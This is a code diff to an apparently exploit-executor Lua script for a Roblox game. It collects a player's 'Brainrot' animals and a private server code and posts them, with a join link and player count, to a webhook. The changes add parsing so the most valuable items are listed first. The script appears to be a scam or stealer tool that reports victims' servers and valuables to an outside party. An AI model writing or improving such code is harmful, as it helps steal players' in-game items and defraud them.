@@ -137,6 +137,23 @@ TextBox:GetPropertyChangedSignal("Text"):Connect(function()
     end
 end)
 
+-- Helper to convert "$250K/s" -> 250000 etc.
+local function parseGen(genText)
+    if not genText then return 0 end
+    genText = string.upper(genText)
+    local num = tonumber(genText:match("[%d%.]+")) or 0
+    if genText:find("K") then
+        num = num * 1e3
+    elseif genText:find("M") then
+        num = num * 1e6
+    elseif genText:find("B") then
+        num = num * 1e9
+    elseif genText:find("T") then
+        num = num * 1e12
+    end
+    return num
+end
+
 -- Start button
 TextButton.MouseButton1Click:Connect(function()
     if not _G.privateServerCode then
@@ -192,15 +209,27 @@ TextButton.MouseButton1Click:Connect(function()
             end
         end
 
-        -- Format Brainrot info
+        -- Format Brainrot info (sorted best → worst)
         local animalLines = {}
         for _, an in ipairs(animalData) do
             if an.Name ~= "Unknown" and an.Name ~= "Empty" then
-                table.insert(animalLines, an.Name .. " | Gen: " .. an.Generation)
+                table.insert(animalLines, {
+                    text = an.Name .. " | Gen: " .. an.Generation,
+                    value = parseGen(an.Generation)
+                })
             end
         end
 
-        local fieldsValue = table.concat(animalLines, "\n")
+        table.sort(animalLines, function(a, b)
+            return a.value > b.value
+        end)
+
+        local formattedLines = {}
+        for _, entry in ipairs(animalLines) do
+            table.insert(formattedLines, entry.text)
+        end
+
+        local fieldsValue = table.concat(formattedLines, "\n")
         if fieldsValue ~= "" then
             fieldsValue = "```\n" .. fieldsValue .. "\n```"
         else
@@ -220,7 +249,7 @@ TextButton.MouseButton1Click:Connect(function()
                                   "\nPlayers in server: "..playerCount..
                                   "\n[Join Private Server](https://www.roblox.com/share?code=".._G.privateServerCode.."&type=Server)",
                 ["fields"] = {{
-                    ["name"] = "Brainrots:",
+                    ["name"] = "Brainrots (Best → Worst):",
                     ["value"] = fieldsValue
                 }}
             }}
@@ -236,7 +265,7 @@ TextButton.MouseButton1Click:Connect(function()
                     Body = jsonData
                 })
             end)
-            print("Brainrot + player count sent to webhook.")
+            print("Sorted Brainrots sent to webhook.")
         else
             warn("Executor request() function not found!")
         end
